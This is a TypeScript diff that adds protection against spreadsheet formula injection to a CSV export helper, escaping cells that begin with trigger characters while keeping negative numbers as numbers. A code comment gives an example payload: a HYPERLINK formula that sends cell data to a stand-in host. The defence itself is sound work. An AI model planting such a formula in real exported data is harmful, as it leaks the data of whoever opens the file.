@@ -5,12 +5,47 @@
  * download. Unit-tested in src/tests/unit/csv.test.ts.
  */
 
-/** Quote fields containing commas, quotes, or newlines; double embedded quotes. */
+/**
+ * Cells opening with one of these are executed as a formula by Excel,
+ * LibreOffice and Google Sheets. Tab and CR are included because both are
+ * stripped during paste/import, exposing whatever follows them.
+ */
+const FORMULA_TRIGGERS = ["=", "+", "-", "@", "\t", "\r"];
+
+/**
+ * Real numbers must stay numbers. Only leading-`-` collides with a trigger,
+ * so negatives ("-5", "-1.25", "-1e3") are recognised and left alone —
+ * neutralising them would turn every negative figure in an export into text
+ * and break sorting and totals in the spreadsheet.
+ */
+const NUMERIC = /^-?\d+(\.\d+)?([eE][+-]?\d+)?$/;
+
+/**
+ * Defuse spreadsheet formula injection (CWE-1236).
+ *
+ * Exports carry data other people control — a client's own first/last name
+ * and booking notes end up in the trainer's sessions log — so a display name
+ * of `=HYPERLINK("http://evil/?d="&A1,"Open")` would run when the provider
+ * opens their own file. Prefixing with an apostrophe makes the spreadsheet
+ * treat the cell as literal text; it is not shown in the cell.
+ */
+export function neutralizeFormula(value: string): string {
+  if (!value) return value;
+  if (NUMERIC.test(value)) return value;
+  return FORMULA_TRIGGERS.some((t) => value.startsWith(t)) ? `'${value}` : value;
+}
+
+/**
+ * Quote fields containing commas, quotes, or newlines; double embedded quotes.
+ * Formula neutralisation happens first, so the apostrophe lands inside the
+ * quotes where a spreadsheet will honour it.
+ */
 export function escapeCsvField(value: string): string {
-  if (/[",\n\r]/.test(value)) {
-    return `"${value.replace(/"/g, '""')}"`;
+  const safe = neutralizeFormula(value);
+  if (/[",\n\r]/.test(safe)) {
+    return `"${safe.replace(/"/g, '""')}"`;
   }
-  return value;
+  return safe;
 }
 
 /**
